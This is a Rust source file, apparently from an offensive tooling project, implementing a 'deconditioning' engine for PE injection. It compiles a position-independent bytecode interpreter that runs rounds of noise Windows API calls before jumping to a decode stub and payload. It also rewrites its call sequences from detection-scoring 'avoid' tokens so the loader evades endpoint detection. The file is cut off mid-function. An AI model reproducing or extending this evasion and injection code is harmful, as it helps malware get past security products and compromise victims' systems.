//! Data-driven deconditioning engine for PE injection.
//!
//! Generates a PIC bytecode interpreter that replays arbitrary Windows API call
//! patterns N rounds before payload execution. The sequence can be generated from
//! presets, manual CLI spec, or triage token feedback (seq2/api_arg tokens).
//!
//! ## Architecture
//!
//! The decon engine uses a 12-opcode API palette and a binary sequence table format.
//! A compiled PIC C stub (`decon_stub.c`) interprets the table at runtime, resolving
//! APIs via PEB walk and dispatching opcodes in a loop.
//!
//! ## Section Layout
//!
//! ```text
//! [decon_stub_code | sequence_table | next_stage...]
//! ```
//!
//! Where next_stage = `[veh_stub | chkpt_data | decode_stub | key | payload]`
//! or `[decode_stub | key | payload]` depending on checkpoint mode.
//!
//! Sentinels: `0xDEC0FEED` (LEA → sequence table), `0xCAFEBABE` (JMP → next stage).

use std::path::Path;

use anyhow::{Context, Result};
use tracing::debug;

// =============================================================================
// Opcode definitions (12-opcode API palette)
// =============================================================================

/// Opcodes for the deconditioning bytecode interpreter.
///
/// Each opcode maps to one or more Windows API calls that the PIC stub will
/// execute at runtime. Opcodes 0-2 operate on memory, 3-4 fill/execute buffers,
/// 5-7 create threads/file IO/registry noise, 8-10 are misc noise, 11 is NOP.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u8)]
pub enum DeconOpcode {
    /// VirtualAlloc(NULL, param_a * 256, MEM_COMMIT|MEM_RESERVE, param_b as protection)
    /// Sets buf_ptr and buf_size.
    /// param_a: size in 256-byte units (0 = 4096 default)
    /// param_b: protection (0x04=RW, 0x40=RWX, 0x02=RX) — default 0x04
    VirtualAlloc = 0,

    /// VirtualProtect(buf_ptr, buf_size, param_a as new_protect, &old)
    /// param_a: new protection constant (e.g., 0x20=RX, 0x40=RWX, 0x04=RW)
    VirtualProtect = 1,

    /// VirtualFree(buf_ptr, 0, MEM_RELEASE)
    /// Clears buf_ptr and buf_size.
    VirtualFree = 2,

    /// memset-equivalent: fills buf_ptr with param_a pattern for buf_size bytes.
    /// param_a: fill byte (0x90=NOP, 0x41='A', etc.)
    /// Inline implementation — no API call.
    MemsetFill = 3,

    /// Call buf_ptr as function pointer. buf_ptr must be executable.
    /// NOP sleds with RET should be written first via MemsetFill(0x90) + write RET.
    CallBuf = 4,

    /// CreateThread(NULL, 0, buf_ptr, NULL, 0, NULL) + WaitForSingleObject + CloseHandle
    /// param_a: wait timeout in ms (0 = 5000ms default)
    CreateThread = 5,

    /// CreateFileA(string[param_a]) + ReadFile(64 bytes) + CloseHandle
    /// param_a: string table index for file path
    CreateFileRead = 6,

    /// RegOpenKeyExA(HKLM, string[param_a]) + RegQueryValueExA(string[param_b]) + RegCloseKey
    /// param_a: string table index for registry key path
    /// param_b: string table index for value name
    RegQuery = 7,

    /// GetEnvironmentVariableA(string[param_a], buf, 256)
    /// param_a: string table index for env var name
    GetEnvVar = 8,

    /// xorshift32 entropy fill: fills buf_ptr with pseudo-random bytes.
    /// param_a: seed (0 = use round index as seed)
    EntropyFill = 9,

    /// Sleep(param_a) — param_a in milliseconds (0 = 10ms default)
    Sleep = 10,

    /// No operation — skip this step.
    Nop = 11,
}

impl DeconOpcode {
    /// Convert from raw byte, returning None for unknown opcodes.
    pub fn from_u8(v: u8) -> Option<Self> {
        match v {
            0 => Some(Self::VirtualAlloc),
            1 => Some(Self::VirtualProtect),
            2 => Some(Self::VirtualFree),
            3 => Some(Self::MemsetFill),
            4 => Some(Self::CallBuf),
            5 => Some(Self::CreateThread),
            6 => Some(Self::CreateFileRead),
            7 => Some(Self::RegQuery),
            8 => Some(Self::GetEnvVar),
            9 => Some(Self::EntropyFill),
            10 => Some(Self::Sleep),
            11 => Some(Self::Nop),
            _ => None,
        }
    }
}

// =============================================================================
// Step flags
// =============================================================================

/// Bit flags for a decon step.
pub mod step_flags {
    /// Use the last VirtualAlloc result (buf_ptr) as implicit first argument.
    pub const USE_LAST_BUF: u8 = 0x01;
    /// Ignore failure of this API call (continue to next step).
    pub const IGNORE_FAILURE: u8 = 0x02;
    /// Step has an 8-byte extension block (7 params total instead of 3).
    pub const HAS_EXT: u8 = 0x04;
}

// =============================================================================
// DeconStep — single instruction in the sequence
// =============================================================================

/// A single step in the deconditioning sequence.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DeconStep {
    pub opcode: DeconOpcode,
    pub flags: u8,
    pub param_a: u16,
    pub param_b: u16,
    pub param_c: u16,
    /// Extended params (only present when flags & HAS_EXT). 4 extra u16 values.
    pub ext: Option<[u16; 4]>,
}

impl DeconStep {
    /// Create a basic step with 3 params, no extension.
    pub fn new(opcode: DeconOpcode, flags: u8, param_a: u16, param_b: u16, param_c: u16) -> Self {
        Self {
            opcode,
            flags,
            param_a,
            param_b,
            param_c,
            ext: None,
        }
    }

    /// Serialized size of this step: 8 bytes base + 8 bytes if HAS_EXT.
    pub fn wire_size(&self) -> usize {
        if self.flags & step_flags::HAS_EXT != 0 {
            16
        } else {
            8
        }
    }
}

// =============================================================================
// DeconSpec — complete sequence specification
// =============================================================================

/// Header magic for the binary sequence table.
pub const DECON_MAGIC: u16 = 0xDEC0;
/// Current format version.
pub const DECON_VERSION: u8 = 0x01;

/// Flag bit 0: free all allocations after loop completes.
pub const DECON_FLAG_FREE_AFTER: u8 = 0x01;

/// Complete deconditioning specification: header + steps + string table.
#[derive(Debug, Clone)]
pub struct DeconSpec {
    /// Number of rounds to execute the step sequence.
    pub round_count: u16,
    /// Header flags (bit 0: free_after_loop).
    pub flags: u8,
    /// Seed for xorshift32 PRNG used by EntropyFill.
    pub seed: u32,
    /// Ordered sequence of steps to execute per round.
    pub steps: Vec<DeconStep>,
    /// String table entries (file paths, registry keys, env var names).
    pub strings: Vec<String>,
}

/// Default preloaded strings that are always available in the string table.
pub const DEFAULT_STRINGS: &[&str] = &[
    "C:\\Windows\\System32\\ntdll.dll",                // 0
    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", // 1
    "ProductName",                                     // 2
    "COMPUTERNAME",                                    // 3
];

impl DeconSpec {
    /// Create a new empty spec with given round count and default strings.
    pub fn new(round_count: u16) -> Self {
        Self {
            round_count,
            flags: DECON_FLAG_FREE_AFTER,
            seed: 0xDEAD0001,
            steps: Vec::new(),
            strings: DEFAULT_STRINGS.iter().map(|s| s.to_string()).collect(),
        }
    }

    /// Add a step to the sequence.
    pub fn push(&mut self, step: DeconStep) {
        self.steps.push(step);
    }

    /// Add a string to the string table and return its index.
    pub fn add_string(&mut self, s: &str) -> u16 {
        // Check if already present
        for (i, existing) in self.strings.iter().enumerate() {
            if existing == s {
                return i as u16;
            }
        }
        let idx = self.strings.len();
        self.strings.push(s.to_string());
        idx as u16
    }

    /// Serialize to binary sequence table format.
    ///
    /// ```text
    /// Header (16 bytes):
    ///   u16 magic = 0xDEC0
    ///   u8  version = 0x01
    ///   u8  flags
    ///   u16 round_count
    ///   u16 step_count
    ///   u32 string_table_offset
    ///   u32 seed
    ///
    /// Steps (variable size, 8 or 16 bytes each):
    ///   u8  opcode
    ///   u8  flags
    ///   u16 param_a
    ///   u16 param_b
    ///   u16 param_c
    ///   [optional 8-byte extension if HAS_EXT]
    ///
    /// String table:
    ///   u16 count
    ///   count × {u16 offset, u16 length}
    ///   string bytes (null-terminated ASCII)
    /// ```
    pub fn serialize(&self) -> Vec<u8> {
        let step_bytes: usize = self.steps.iter().map(|s| s.wire_size()).sum();
        let header_size = 16;

        // Build string table payload
        let string_table_payload = self.serialize_string_table();
        let string_table_offset = header_size + step_bytes;
        let total = string_table_offset + string_table_payload.len();

        let mut buf = Vec::with_capacity(total);

        // Header
        buf.extend_from_slice(&DECON_MAGIC.to_le_bytes());
        buf.push(DECON_VERSION);
        buf.push(self.flags);
        buf.extend_from_slice(&self.round_count.to_le_bytes());
        buf.extend_from_slice(&(self.steps.len() as u16).to_le_bytes());
        buf.extend_from_slice(&(string_table_offset as u32).to_le_bytes());
        buf.extend_from_slice(&self.seed.to_le_bytes());

        // Steps
        for step in &self.steps {
            buf.push(step.opcode as u8);
            buf.push(step.flags);
            buf.extend_from_slice(&step.param_a.to_le_bytes());
            buf.extend_from_slice(&step.param_b.to_le_bytes());
            buf.extend_from_slice(&step.param_c.to_le_bytes());
            if step.flags & step_flags::HAS_EXT != 0 {
                let ext = step.ext.unwrap_or([0; 4]);
                for val in &ext {
                    buf.extend_from_slice(&val.to_le_bytes());
                }
            }
        }

        // String table
        buf.extend_from_slice(&string_table_payload);

        debug_assert_eq!(buf.len(), total);
        buf
    }

    /// Deserialize from binary sequence table format.
    pub fn deserialize(data: &[u8]) -> Result<Self> {
        if data.len() < 16 {
            anyhow::bail!("Decon table too short: {} bytes (need >= 16)", data.len());
        }

        let magic = u16::from_le_bytes([data[0], data[1]]);
        if magic != DECON_MAGIC {
            anyhow::bail!(
                "Bad decon magic: {:#06x} (expected {:#06x})",
                magic,
                DECON_MAGIC
            );
        }

        let version = data[2];
        if version != DECON_VERSION {
            anyhow::bail!(
                "Unknown decon version: {} (expected {})",
                version,
                DECON_VERSION
            );
        }

        let flags = data[3];
        let round_count = u16::from_le_bytes([data[4], data[5]]);
        let step_count = u16::from_le_bytes([data[6], data[7]]) as usize;
        let string_table_offset =
            u32::from_le_bytes([data[8], data[9], data[10], data[11]]) as usize;
        let seed = u32::from_le_bytes([data[12], data[13], data[14], data[15]]);

        // Parse steps
        let mut steps = Vec::with_capacity(step_count);
        let mut pos = 16;
        for _ in 0..step_count {
            if pos + 8 > data.len() {
                anyhow::bail!("Truncated step at offset {}", pos);
            }
            let opcode = DeconOpcode::from_u8(data[pos])
                .ok_or_else(|| anyhow::anyhow!("Unknown opcode {} at offset {}", data[pos], pos))?;
            let step_flags = data[pos + 1];
            let param_a = u16::from_le_bytes([data[pos + 2], data[pos + 3]]);
            let param_b = u16::from_le_bytes([data[pos + 4], data[pos + 5]]);
            let param_c = u16::from_le_bytes([data[pos + 6], data[pos + 7]]);

            let ext = if step_flags & step_flags::HAS_EXT != 0 {
                if pos + 16 > data.len() {
                    anyhow::bail!("Truncated extended step at offset {}", pos);
                }
                let d = u16::from_le_bytes([data[pos + 8], data[pos + 9]]);
                let e = u16::from_le_bytes([data[pos + 10], data[pos + 11]]);
                let f = u16::from_le_bytes([data[pos + 12], data[pos + 13]]);
                let g = u16::from_le_bytes([data[pos + 14], data[pos + 15]]);
                pos += 16;
                Some([d, e, f, g])
            } else {
                pos += 8;
                None
            };

            steps.push(DeconStep {
                opcode,
                flags: step_flags,
                param_a,
                param_b,
                param_c,
                ext,
            });
        }

        // Parse string table
        let strings = if string_table_offset < data.len() {
            Self::deserialize_string_table(&data[string_table_offset..])?
        } else {
            Vec::new()
        };

        Ok(Self {
            round_count,
            flags,
            seed,
            steps,
            strings,
        })
    }

    fn serialize_string_table(&self) -> Vec<u8> {
        let count = self.strings.len() as u16;
        // Directory: count + count * (offset_u16 + length_u16)
        let dir_size = 2 + (self.strings.len() * 4);

        // Calculate string data section
        let mut string_data = Vec::new();
        let mut entries: Vec<(u16, u16)> = Vec::with_capacity(self.strings.len());
        for s in &self.strings {
            let offset = string_data.len() as u16;
            let len = s.len() as u16;
            string_data.extend_from_slice(s.as_bytes());
            string_data.push(0); // null terminator
            entries.push((offset, len));
        }

        // Adjust offsets: they're relative to start of string data,
        // but we need them relative to after the directory.
        let mut buf = Vec::with_capacity(dir_size + string_data.len());
        buf.extend_from_slice(&count.to_le_bytes());
        for (offset, length) in &entries {
            buf.extend_from_slice(&offset.to_le_bytes());
            buf.extend_from_slice(&length.to_le_bytes());
        }
        buf.extend_from_slice(&string_data);
        buf
    }

    fn deserialize_string_table(data: &[u8]) -> Result<Vec<String>> {
        if data.len() < 2 {
            return Ok(Vec::new());
        }
        let count = u16::from_le_bytes([data[0], data[1]]) as usize;
        let dir_size = 2 + count * 4;
        if data.len() < dir_size {
            anyhow::bail!("Truncated string table directory");
        }

        let string_data_start = dir_size;
        let mut strings = Vec::with_capacity(count);
        for i in 0..count {
            let entry_off = 2 + i * 4;
            let offset = u16::from_le_bytes([data[entry_off], data[entry_off + 1]]) as usize;
            let length = u16::from_le_bytes([data[entry_off + 2], data[entry_off + 3]]) as usize;
            let abs_offset = string_data_start + offset;
            if abs_offset + length > data.len() {
                anyhow::bail!(
                    "String {} out of bounds (offset={}, length={})",
                    i,
                    offset,
                    length
                );
            }
            let s = std::str::from_utf8(&data[abs_offset..abs_offset + length])
                .context("Invalid UTF-8 in string table")?;
            strings.push(s.to_string());
        }
        Ok(strings)
    }

    /// Total serialized size in bytes.
    pub fn serialized_size(&self) -> usize {
        let step_bytes: usize = self.steps.iter().map(|s| s.wire_size()).sum();
        let string_table_size = self.serialize_string_table().len();
        16 + step_bytes + string_table_size
    }
}

// =============================================================================
// Presets — mirrors template deconditioner modules
// =============================================================================

/// Preset deconditioning sequences that mirror the template path deconditioner modules.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DeconPreset {
    /// alloc→fill→protect→free (mirrors basic.c)
    AllocLoop,
    /// alloc→NOP fill→protect→call→free (mirrors alloc_exec.c)
    AllocExec,
    /// alloc→fileIO→fill→regIO→protect→envVar→free (mirrors mixed_apis.c)
    MixedApis,
    /// alloc→entropy_fill→protect→free (mirrors entropy_flood.c)
    EntropyFlood,
    /// alloc→NOP fill→protect→createThread→free (mirrors thread_alloc.c)
    ThreadAlloc,
}

impl DeconPreset {
    /// Parse from string (case-insensitive).
    pub fn parse(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "alloc_loop" | "allocloop" | "basic" => Some(Self::AllocLoop),
            "alloc_exec" | "allocexec" => Some(Self::AllocExec),
            "mixed_apis" | "mixedapis" | "mixed" => Some(Self::MixedApis),
            "entropy_flood" | "entropyflood" | "entropy" => Some(Self::EntropyFlood),
            "thread_alloc" | "threadalloc" | "thread" => Some(Self::ThreadAlloc),
            _ => None,
        }
    }

    /// Generate a DeconSpec from this preset with the given round count.
    pub fn to_spec(&self, rounds: u16) -> DeconSpec {
        let mut spec = DeconSpec::new(rounds);
        match self {
            Self::AllocLoop => build_alloc_loop(&mut spec),
            Self::AllocExec => build_alloc_exec(&mut spec),
            Self::MixedApis => build_mixed_apis(&mut spec),
            Self::EntropyFlood => build_entropy_flood(&mut spec),
            Self::ThreadAlloc => build_thread_alloc(&mut spec),
        }
        spec
    }
}

/// Helper: VirtualAlloc(RW, 16 * 256 = 4096 bytes)
fn step_alloc_rw() -> DeconStep {
    DeconStep::new(
        DeconOpcode::VirtualAlloc,
        step_flags::IGNORE_FAILURE,
        16,
        0x04,
        0,
    )
}

/// Helper: VirtualProtect → RX (0x20 = PAGE_EXECUTE_READ)
fn step_protect_rx() -> DeconStep {
    DeconStep::new(
        DeconOpcode::VirtualProtect,
        step_flags::USE_LAST_BUF | step_flags::IGNORE_FAILURE,
        0x20,
        0,
        0,
    )
}

/// Helper: VirtualFree
fn step_free() -> DeconStep {
    DeconStep::new(
        DeconOpcode::VirtualFree,
        step_flags::USE_LAST_BUF | step_flags::IGNORE_FAILURE,
        0,
        0,
        0,
    )
}

/// Helper: memset fill with XOR pattern (byte 0x41 = 'A')
fn step_fill_xor() -> DeconStep {
    DeconStep::new(
        DeconOpcode::MemsetFill,
        step_flags::USE_LAST_BUF,
        0x41,
        0,
        0,
    )
}

/// Helper: memset fill with NOP (0x90), then write RET at end
fn step_fill_nop() -> DeconStep {
    // param_a = fill byte (0x90), param_b = 1 means "write 0xC3 at last byte"
    DeconStep::new(
        DeconOpcode::MemsetFill,
        step_flags::USE_LAST_BUF,
        0x90,
        1, // signal to write RET at end
        0,
    )
}

/// AllocLoop: alloc→fill→protect→free (mirrors basic.c)
fn build_alloc_loop(spec: &mut DeconSpec) {
    spec.push(step_alloc_rw());
    spec.push(step_fill_xor());
    spec.push(step_protect_rx());
    spec.push(step_free());
}

/// AllocExec: alloc→NOP fill→protect→call→free (mirrors alloc_exec.c)
fn build_alloc_exec(spec: &mut DeconSpec) {
    spec.push(step_alloc_rw());
    spec.push(step_fill_nop());
    spec.push(step_protect_rx());
    spec.push(DeconStep::new(
        DeconOpcode::CallBuf,
        step_flags::USE_LAST_BUF | step_flags::IGNORE_FAILURE,
        0,
        0,
        0,
    ));
    spec.push(step_free());
}

/// MixedApis: alloc→fileIO→fill→regIO→protect→envVar→free (mirrors mixed_apis.c)
fn build_mixed_apis(spec: &mut DeconSpec) {
    // String indices 0-3 are the defaults
    spec.push(step_alloc_rw());
    // CreateFileA(ntdll.dll) + ReadFile + CloseHandle
    spec.push(DeconStep::new(
        DeconOpcode::CreateFileRead,
        step_flags::IGNORE_FAILURE,
        0, // string[0] = ntdll.dll path
        0,
        0,
    ));
    spec.push(step_fill_xor());
    // RegOpenKeyExA + RegQueryValueExA + RegCloseKey
    spec.push(DeconStep::new(
        DeconOpcode::RegQuery,
        step_flags::IGNORE_FAILURE,
        1, // string[1] = registry key
        2, // string[2] = "ProductName"
        0,
    ));
    spec.push(step_protect_rx());
    // GetEnvironmentVariableA("COMPUTERNAME")
    spec.push(DeconStep::new(
        DeconOpcode::GetEnvVar,
        step_flags::IGNORE_FAILURE,
        3, // string[3] = "COMPUTERNAME"
        0,
        0,
    ));
    spec.push(step_free());
}

/// EntropyFlood: alloc→entropy_fill→protect→free (mirrors entropy_flood.c)
fn build_entropy_flood(spec: &mut DeconSpec) {
    spec.push(step_alloc_rw());
    spec.push(DeconStep::new(
        DeconOpcode::EntropyFill,
        step_flags::USE_LAST_BUF,
        0, // seed = 0 means use round index
        0,
        0,
    ));
    spec.push(step_protect_rx());
    spec.push(step_free());
}

/// ThreadAlloc: alloc→NOP fill→protect→createThread→free (mirrors thread_alloc.c)
fn build_thread_alloc(spec: &mut DeconSpec) {
    spec.push(step_alloc_rw());
    spec.push(step_fill_nop());
    spec.push(step_protect_rx());
    spec.push(DeconStep::new(
        DeconOpcode::CreateThread,
        step_flags::USE_LAST_BUF | step_flags::IGNORE_FAILURE,
        5000, // wait timeout ms
        0,
        0,
    ));
    spec.push(step_free());
}

// =============================================================================
// Guidance-driven generation
// =============================================================================

/// Triage token guidance — avoid/seek token lists from the scoring system.
/// This is a simplified representation; the controller's TriageGuidance proto
/// message has richer fields. Here we only need the token strings.
pub struct TriageGuidance {
    pub avoid_tokens: Vec<String>,
    pub seek_tokens: Vec<String>,
}

impl DeconSpec {
    /// Generate a decon spec from triage guidance.
    ///
    /// Algorithm:
    /// 1. Parse `seq2:A→B` bigrams from avoid_tokens
    /// 2. Map API names to opcodes
    /// 3. Insert noise ops between dangerous bigram pairs
    /// 4. Parse `api_arg:F:protect=VALUE` for VirtualProtect params
    /// 5. Exclude seek_token patterns (they help evasion)
    /// 6. Start from MixedApis base, modify with guidance
    pub fn from_guidance(guidance: &TriageGuidance, rounds: u16) -> Self {
        let mut spec = DeconPreset::MixedApis.to_spec(rounds);

        // Parse avoid seq2 bigrams
        let mut avoid_bigrams: Vec<(String, String)> = Vec::new();
        let mut avoid_protections: Vec<u16> = Vec::new();

        for token in &guidance.avoid_tokens {
            if let Some(bigram_str) = token.strip_prefix("seq2:") {
                // Format: "API1->API2" or "API1→API2"
                let parts: Vec<&str> = if bigram_str.contains("->") {
                    bigram_str.split("->").collect()
                } else if bigram_str.contains('\u{2192}') {
                    bigram_str.split('\u{2192}').collect()
                } else {
                    continue;
                };
                if parts.len() == 2 {
                    avoid_bigrams.push((parts[0].trim().to_string(), parts[1].trim().to_string()));
                }
            } else if let Some(arg_str) = token.strip_prefix("api_arg:") {
                // Format: "VirtualProtect:flProtect=0x20"
                if (arg_str.starts_with("VirtualProtect:")
                    || arg_str.starts_with("NtProtectVirtualMemory:"))
                    && let Some(val_str) = arg_str.split('=').nth(1)
                    && let Ok(val) = parse_protection_value(val_str.trim())
                {
                    avoid_protections.push(val);
                }
            }
        }

        // Collect seek patterns to exclude from dilution
        let mut seek_apis: Vec<String> = Vec::new();
        for token in &guidance.seek_tokens {
            if let Some(api_str) = token.strip_prefix("api:") {
                seek_apis.push(api_str.to_string());
            }
        }

        // Insert noise steps to dilute avoid bigrams
        if !avoid_bigrams.is_empty() {
            let mut new_steps = Vec::new();
            for (i, step) in spec.steps.iter().enumerate() {
                new_steps.push(step.clone());

                // Check if this step + next step forms an avoided bigram
                if i + 1 < spec.steps.len() {
                    let current_api = opcode_to_api_name(step.opcode);
                    let next_api = opcode_to_api_name(spec.steps[i + 1].opcode);

                    for (avoid_a, avoid_b) in &avoid_bigrams {
                        if api_name_matches(current_api, avoid_a)
                            && api_name_matches(next_api, avoid_b)
                        {
                            // Insert noise ops between the bigram pair
                            // Use file IO and env var to break the sequence
                            new_steps.push(DeconStep::new(
                                DeconOpcode::CreateFileRead,
                                step_flags::IGNORE_FAILURE,
                                0,
                                0,
                                0,
                            ));
                            new_steps.push(DeconStep::new(
                                DeconOpcode::GetEnvVar,
                                step_flags::IGNORE_FAILURE,
                                3,
                                0,
                                0,
                            ));
                            break;
                        }
                    }
                }
            }
            spec.steps = new_steps;
        }

        // Modify VirtualProtect steps to match avoided protection values
        // (rehearse the exact pattern that triggers detection)
        if !avoid_protections.is_empty() {
            for step in &mut spec.steps {
                if step.opcode == DeconOpcode::VirtualProtect {
                    // Use the first avoided protection value to rehearse it
                    step.param_a = avoid_protections[0];
                }
            }
        }

        spec
    }
}

/// Map Windows API names (including Nt* variants) to decon opcodes.
fn map_api_to_opcode(api_name: &str) -> Option<DeconOpcode> {
    match api_name {
        "VirtualAlloc" | "NtAllocateVirtualMemory" | "VirtualAllocEx" => {
            Some(DeconOpcode::VirtualAlloc)
        }
        "VirtualProtect" | "NtProtectVirtualMemory" | "VirtualProtectEx" => {
            Some(DeconOpcode::VirtualProtect)
        }
        "VirtualFree" | "NtFreeVirtualMemory" => Some(DeconOpcode::VirtualFree),
        "CreateThread" | "CreateRemoteThread" | "NtCreateThreadEx" | "RtlCreateUserThread" => {
            Some(DeconOpcode::CreateThread)
        }
        "CreateFileA" | "CreateFileW" | "NtCreateFile" | "ReadFile" | "NtReadFile" => {
            Some(DeconOpcode::CreateFileRead)
        }
        "RegOpenKeyExA" | "RegOpenKeyExW" | "RegQueryValueExA" | "RegQueryValueExW" => {
            Some(DeconOpcode::RegQuery)
        }
        "GetEnvironmentVariableA" | "GetEnvironmentVariableW" => Some(DeconOpcode::GetEnvVar),
        "Sleep" | "NtDelayExecution" | "SleepEx" => Some(DeconOpcode::Sleep),
        _ => None,
    }
}

/// Get the primary API name string for an opcode.
fn opcode_to_api_name(opcode: DeconOpcode) -> &'static str {
    match opcode {
        DeconOpcode::VirtualAlloc => "VirtualAlloc",
        DeconOpcode::VirtualProtect => "VirtualProtect",
        DeconOpcode::VirtualFree => "VirtualFree",
        DeconOpcode::MemsetFill => "memset",
        DeconOpcode::CallBuf => "call",
        DeconOpcode::CreateThread => "CreateThread",
        DeconOpcode::CreateFileRead => "CreateFileA",
        DeconOpcode::RegQuery => "RegOpenKeyExA",
        DeconOpcode::GetEnvVar => "GetEnvironmentVariableA",
        DeconOpcode::EntropyFill => "entropy_fill",
        DeconOpcode::Sleep => "Sleep",
        DeconOpcode::Nop => "nop",
    }
}

/// Check if a detected API name matches an opcode's API (handles Nt* variants).
fn api_name_matches(opcode_api: &str, detected_api: &str) -> bool {
    if opcode_api == detected_api {
        return true;
    }
    // Check if the detected API maps to the same opcode
    if let Some(detected_opcode) = map_api_to_opcode(detected_api) {
        let canonical = opcode_to_api_name(detected_opcode);
        return canonical == opcode_api;
    }
    false
}

/// Parse a protection value like "0x20", "RWX", "R-X" to a u16.
fn parse_protection_value(s: &str) -> Result<u16> {
    // Try hex first
    if let Some(hex) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
        let val = u16::from_str_radix(hex, 16)
            .with_context(|| format!("Invalid hex protection: {}", s))?;
        return Ok(val);
    }
    // Try named constants
    match s {
        "RW" | "PAGE_READWRITE" => Ok(0x04),
        "RX" | "R-X" | "PAGE_EXECUTE_READ" => Ok(0x20),
        "RWX" | "PAGE_EXECUTE_READWRITE" => Ok(0x40),
        _ => {
            // Try decimal
            let val: u16 = s
                .parse()
                .with_context(|| format!("Invalid protection value: {}", s))?;
            Ok(val)
        }
    }
}

// =============================================================================
// Stub compilation and section assembly
// =============================================================================

/// Sentinel for LEA to sequence table data.
pub const DECON_DATA_SENTINEL: u32 = 0xDEC0FEED;
/// Sentinel for JMP to next stage (reuses VEH's sentinel).
pub const DECON_JMP_SENTINEL: u32 = 0xCAFEBABE;

/// Layout information for the compiled decon stub.
#[derive(Debug, Clone)]
pub struct DeconStubLayout {
    /// Size of the compiled stub code (.text section bytes).
    pub code_size: usize,
    /// Offset of the disp32 for the LEA pointing to the sequence table.
    pub data_lea_disp_offset: usize,
    /// Offset of the disp32 for the JMP to next stage.
    pub next_jmp_disp_offset: usize,
}

/// Compile the decon stub C source to a COFF .o, extract .text bytes,
/// and locate sentinel patch offsets.
///
/// Follows the same pattern as `compile_veh_stub()`.
pub fn compile_decon_stub(
    xwin_dir: &Path,
    source_path: &Path,
    cache_dir: &Path,
) -> Result<(Vec<u8>, DeconStubLayout)> {
    let obj_path = cache_dir.join("decon_stub.o");
    let exe_path = cache_dir.join("decon_stub.exe");

    // Check cache: skip if linked .exe is newer than source
    let needs_compile = if exe_path.exists() {
        let src_mtime = std::fs::metadata(source_path)
            .and_then(|m| m.modified())
            .unwrap_or(std::time::SystemTime::UNIX_EPOCH);
        let exe_mtime = std::fs::metadata(&exe_path)
            .and_then(|m| m.modified())
            .unwrap_or(std::time::SystemTime::UNIX_EPOCH);
        src_mtime > exe_mtime
    } else {
        true
    };

    if needs_compile {
        std::fs::create_dir_all(cache_dir).context("Failed to create decon stub cache dir")?;

        let crt_include = xwin_dir.join("crt").join("include");
        let sdk_ucrt = xwin_dir.join("sdk").join("include").join("ucrt");
        let sdk_um = xwin_dir.join("sdk").join("include").join("um");
        let sdk_shared = xwin_dir.join("sdk").join("include").join("shared");

        // Step 1: Compile C → COFF .o
        let output = std::process::Command::new("clang")
            .args([
                "-c",
                "-O2",
                "-nostdlib",
                "-fno-stack-protector",
                "-fno-exceptions",
                "--target=x86_64-pc-windows-msvc",
                "-fms-compatibility",
                "-fms-extensions",
                "-fno-builtin",
                "-mno-red-zone",
            ])
            .arg(format!("-I{}", crt_include.display()))
            .arg(format!("-I{}", sdk_ucrt.display()))
            .arg(format!("-I{}", sdk_um.display()))
            .arg(format!("-I{}", sdk_shared.display()))
            .arg(format!("--sysroot={}", xwin_dir.display()))
            .arg("-o")
            .arg(obj_path.to_str().unwrap_or_default())
            .arg(source_path.to_str().unwrap_or_default())
            .output()
            .context("Failed to invoke clang for decon stub compilation")?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            anyhow::bail!(
                "Decon stub compilation failed (exit {}):\n{}",
                output.status,
                stderr
            );
        }

        // Step 2: Link .o → .exe with /merge:.rdata=.text
        let lld_link = if cfg!(target_os = "linux") {
            "/usr/lib/llvm-17/bin/lld-link"
        } else {
            "lld-link"
        };
        let link_output = std::process::Command::new(lld_link)
            .arg("/entry:stub_entry")
            .arg("/nodefaultlib")
            .arg("/subsystem:console")
            .arg("/merge:.rdata=.text")
            .arg(format!("/out:{}", exe_path.to_str().unwrap_or_default()))
            .arg(obj_path.to_str().unwrap_or_default())
            .output()
            .context("Failed to invoke lld-link for decon stub linking")?;

        if !link_output.status.success() {
            let stderr = String::from_utf8_lossy(&link_output.stderr);
            anyhow::bail!(
                "Decon stub linking failed (exit {}):\n{}",
                link_output.status,
                stderr
            );
        }
    }

    // Extract .text from linked PE (all relocations resolved, .rdata merged)
    let exe_bytes = std::fs::read(&exe_path).context("Failed to read linked decon stub .exe")?;
    let text_bytes = super::stubs::extract_coff_text_section(&exe_bytes)
        .context("Failed to extract .text from linked decon stub PE")?;

    // Find sentinels
    let layout = find_decon_stub_sentinels(&text_bytes)
        .context("Failed to locate sentinel values in decon stub code")?;

    debug!(
        "Decon stub: {} bytes, data_lea@{:#x}, jmp@{:#x}",
        text_bytes.len(),
        layout.data_lea_disp_offset,
        layout.next_jmp_disp_offset,
    );

    Ok((text_bytes, layout))
}

/// Scan compiled decon stub code for sentinel patterns.
fn find_decon_stub_sentinels(code: &[u8]) -> Result<DeconStubLayout> {
    let data_sentinel = DECON_DATA_SENTINEL.to_le_bytes();
    let jmp_sentinel = DECON_JMP_SENTINEL.to_le_bytes();

    let mut data_offset = None;
    let mut jmp_offset = None;

    for i in 0..code.len().saturating_sub(3) {
        if code[i..i + 4] == data_sentinel && data_offset.is_none() {
            data_offset = Some(i);
        }
        if code[i..i + 4] == jmp_sentinel && jmp_offset.is_none() {
            jmp_offset = Some(i);
        }
    }

    let data_lea_disp_offset = data_offset.ok_or_else(|| {
        anyhow::anyhow!(
            "Sentinel {:#010x} not found in decon stub",
            DECON_DATA_SENTINEL
        )
    })?;
    let next_jmp_disp_offset = jmp_offset.ok_or_else(|| {
        anyhow::anyhow!(
            "Sentinel {:#010x} not found in decon stub",
            DECON_JMP_SENTINEL
        )
    })?;

    Ok(DeconStubLayout {
        code_size: code.len(),
        data_lea_disp_offset,
        next_jmp_disp_offset,
    })
}

/// Assemble the complete decon section: [decon_stub | sequence_table | (next_stage follows)]
///
/// Patches the two sentinels:
/// - Data LEA → points to sequence_table (right after stub code)
/// - JMP → jumps past sequence_table to next_stage
///
/// The caller is responsible for appending the next_stage bytes (VEH/carrier section)
/// after the returned bytes.
///
/// Returns the assembled decon prefix bytes and the offset where next_stage should begin.
pub fn assemble_decon_section(
    decon_code: &[u8],
    decon_layout: &DeconStubLayout,
    sequence_table: &[u8],
) -> (Vec<u8>, usize) {
    let total = decon_code.len() + sequence_table.len();
    let mut section = Vec::with_capacity(total);

    // 1. Decon stub code
